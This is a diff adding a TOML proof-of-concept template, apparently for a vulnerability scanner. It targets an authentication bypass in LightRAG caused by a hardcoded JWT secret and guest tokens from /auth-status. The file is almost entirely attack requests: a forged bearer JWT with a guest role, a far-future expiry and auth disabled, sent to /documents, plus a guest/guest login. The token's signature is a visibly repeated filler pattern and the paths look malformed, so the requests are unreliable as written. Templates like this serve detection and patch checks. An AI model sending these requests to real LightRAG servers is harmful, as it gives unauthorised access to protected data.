@@ -1,0 +1,68 @@
+[info]
+author = "AVE"
+description = "LightRAG 在仅配置 LIGHTRAG_API_KEY 未设置 AUTH_ACCOUNTS 时，因硬编码 DEFAULT_TOKEN_SECRET 和 /auth-status 公开签发访客 JWT，导致远程未认证攻击者可绕过 X-API-Key 保护调用所有受保护接口"
+id = "POC-AVE-2026-0900"
+name = "LightRAG API密钥认证绕过 PoC"
+severity = "critical"
+tags = [
+    "cve-2026-61740",
+    "lightrag",
+    "auth-bypass",
+    "hardcoded-secret",
+]
+vuln_id = [
+    "CVE-2026-61740",
+    "AVE-2026-0900",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/documents"
+protocol = "http"
+
+[poc.requests.headers]
+Authorization = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJndWVzdCIsInJvbGUiOiJndWVzdCIsImV4cCI6OTk5OTk5OTk5OSwibWV0YWRhdGEiOnsiYXV0aF9tb2RlIjoiZGlzYWJsZWQifX0.4J0jVxJ0jVxJ0jVxJ0jVxJ0jVxJ0jVxJ0jVxJ0jVxJ0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "statuses",
+    "documents",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/auth-status"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "guest",
+    "token",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/login"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"username":"guest","password":"guest"}'
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["access_token"]
